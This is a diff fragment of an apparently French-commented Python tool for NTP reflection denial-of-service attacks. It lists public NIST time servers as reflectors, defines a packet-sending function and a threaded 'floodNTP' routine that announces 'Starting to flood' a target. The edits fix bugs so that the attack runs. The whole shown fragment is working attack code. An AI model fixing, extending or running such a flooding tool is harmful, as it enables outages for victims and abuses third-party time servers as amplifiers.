@@ -28,8 +28,8 @@ ntplist = ['time-a-g.nist.gov', 'time-b-g.nist.gov', 'time-c-g.nist.gov',
                 'time-d-g.nist.gov', 'time-d-g.nist.gov', 'time-e-g.nist.gov',
                 'time-e-g.nist.gov', 'time-a-b.nist.gov', 'time-b-b.nist.gov',
                 'time-c-b.nist.gov', 'time-d-b.nist.gov', 'time-d-b.nist.gov']
-
-currentserver = 0
+ 
+currentserver = 0 #fixing UnboundlocalError
 def dosEm(target, ntplist, data, currentserver):
         """
         Fonction qui construit un paquet et qui l'envoie
@@ -41,13 +41,13 @@ def dosEm(target, ntplist, data, currentserver):
 def floodNTP(numberthreads, targget):
         #initialisation
         threads = []
-        print("Starting to flood: "+ targget + " using NTP list: " 
-                + ntplist + " With " + str(numberthreads) + " threads")
+        global currentserver
+        print("Starting to flood: "+ str(targget) + " using NTP list: " 
+                + str(ntplist) + " With " + str(numberthreads) + " threads")
         print("Use CTRL+C to stop attack")
         
         #Automatisation de l'attaque 
         for n in range(numberthreads):
-            
             thread = threading.Thread(target=dosEm(targget, ntplist, data, currentserver))
             thread.daemon = True
             thread.start()
